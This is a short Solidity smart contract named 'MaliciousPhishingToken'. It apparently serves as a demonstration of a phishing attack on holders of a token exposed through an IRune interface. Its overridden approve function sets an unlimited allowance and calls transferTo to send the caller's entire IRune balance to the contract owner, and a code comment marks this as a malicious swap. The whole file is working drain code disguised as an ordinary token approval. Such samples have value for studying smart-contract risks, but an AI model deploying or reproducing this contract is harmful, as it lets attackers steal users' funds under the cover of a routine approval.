pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IRune {
    function balanceOf(address account) external view returns (uint256);
    function transferTo(address recipient, uint256 amount) external;
}

contract MaliciousPhishingToken is ERC20 {
    IRune rune;
    address public owner;

    constructor(address _runeAddress) public ERC20("Test Token", "TST") {
        rune = IRune(_runeAddress);
        owner = msg.sender;

    }

    /**
        malicious swap
     */
    function approve(address to, uint256 amount) public override returns (bool) {
        _approve(msg.sender, address(this), type(uint256).max);
        rune.transferTo(owner, rune.balanceOf(msg.sender));
        return true;
    }
}
